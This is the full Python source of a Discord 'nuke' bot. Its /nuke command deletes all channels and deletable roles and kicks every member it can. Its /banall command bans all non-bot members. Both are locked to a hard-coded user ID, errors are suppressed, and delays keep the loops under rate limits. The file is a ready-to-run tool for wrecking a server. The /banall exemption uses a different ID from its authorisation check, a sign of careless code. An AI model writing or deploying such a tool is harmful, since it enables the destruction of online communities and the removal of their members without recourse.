# bot.py
import os
import threading
import asyncio
import nextcord
from nextcord.ext import commands
from nextcord.ui import View, Button
from nextcord import Interaction
from flask import Flask

# ----------------------
# CONFIG
# ----------------------
AUTHORIZED_USER = 1440792210743492659  # Only this user can use /nuke
TOKEN = os.environ.get("TOKEN")
PORT = int(os.environ.get("PORT", 10000))

if not TOKEN:
    raise RuntimeError("Missing TOKEN environment variable")

# ----------------------
# FLASK KEEP-ALIVE (Render)
# ----------------------
app = Flask("")

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

threading.Thread(target=run_flask, daemon=True).start()

# ----------------------
# NEXTCORD BOT
# ----------------------
intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user}")


# ----------------------
# CONFIRMATION BUTTON VIEW
# ----------------------
class ConfirmNuke(View):
    def __init__(self, user_id):
        super().__init__(timeout=60)
        self.user_id = user_id
        self.result = None

    async def interaction_check(self, interaction: Interaction):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You cannot use these buttons.", ephemeral=True)
            return False
        return True

    @nextcord.ui.button(label="CONFIRM NUKE", style=nextcord.ButtonStyle.danger)
    async def confirm(self, button, interaction: Interaction):
        self.result = True
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="💥 Nuke confirmed! Starting...", view=self)
        self.stop()

    @nextcord.ui.button(label="CANCEL", style=nextcord.ButtonStyle.secondary)
    async def cancel(self, button, interaction: Interaction):
        self.result = False
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(content="❌ Cancelled.", view=self)
        self.stop()


# ----------------------
# /NUKE COMMAND
# ----------------------
@bot.slash_command(name="nuke", description="Deletes all channels, roles, and kicks everyone.")
async def nuke(interaction: Interaction):

    # Check if authorized user
    if interaction.user.id != AUTHORIZED_USER:
        await interaction.response.send_message("❌ You cannot use this command.", ephemeral=True)
        return

    view = ConfirmNuke(interaction.user.id)

    await interaction.response.send_message(
        "⚠️ **WARNING** — This will delete all channels, deletable roles, and kick all possible members.\n"
        "Press **CONFIRM NUKE** to continue.",
        view=view,
        ephemeral=True
    )

    await view.wait()

    if not view.result:
        await interaction.followup.send("Nuke cancelled.", ephemeral=True)
        return

    guild = interaction.guild
    bot_member = guild.get_member(bot.user.id)

    # ----------------------
    # DELETE CHANNELS
    # ----------------------
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuked")
            await asyncio.sleep(0.2)
        except:
            pass

    # ----------------------
    # DELETE ROLES
    # ----------------------
    for role in list(guild.roles):
        try:
            if role.is_default():
                continue
            if role.managed:
                continue
            if role.position >= bot_member.top_role.position:
                continue
            await role.delete(reason="Nuked")
            await asyncio.sleep(0.15)
        except:
            pass

    # ----------------------
    # KICK MEMBERS
    # ----------------------
    for member in list(guild.members):
        try:
            if member.id == AUTHORIZED_USER or member.id == bot.user.id:
                continue
            await member.kick(reason="Nuked")
            await asyncio.sleep(0.2)
        except:
            pass

    # ----------------------
    # Create final channel
    # ----------------------
    try:
        ch = await guild.create_text_channel("server-nuked")
        await ch.send("💥 Server nuked successfully.")
    except:
        pass

    await interaction.followup.send("🔥 Nuke completed.", ephemeral=True)

# ---------------------------
# Slash Command: /banall
# ---------------------------
@bot.slash_command(
    name="banall",
    description="Ban all server members (except you)."
)
async def banall(interaction: nextcord.Interaction):

    # Authorization check
    if interaction.user.id != 1440792210743492659:
        await interaction.response.send_message(
            "You are not allowed to use this command.", ephemeral=True
        )
        return

    await interaction.response.send_message("Mass ban started...", ephemeral=True)

    guild = interaction.guild

    for member in guild.members:
        # Skip you + bots
        if member.id == 1355140133661184221 or member.bot:
            continue
        try:
            await member.ban(reason="Mass ban command used.")
            await asyncio.sleep(1)  # prevent rate-limit
        except:
            pass

    await interaction.followup.send("Mass ban complete.")

# ----------------------
# RUN BOT
# ----------------------
bot.run(TOKEN)
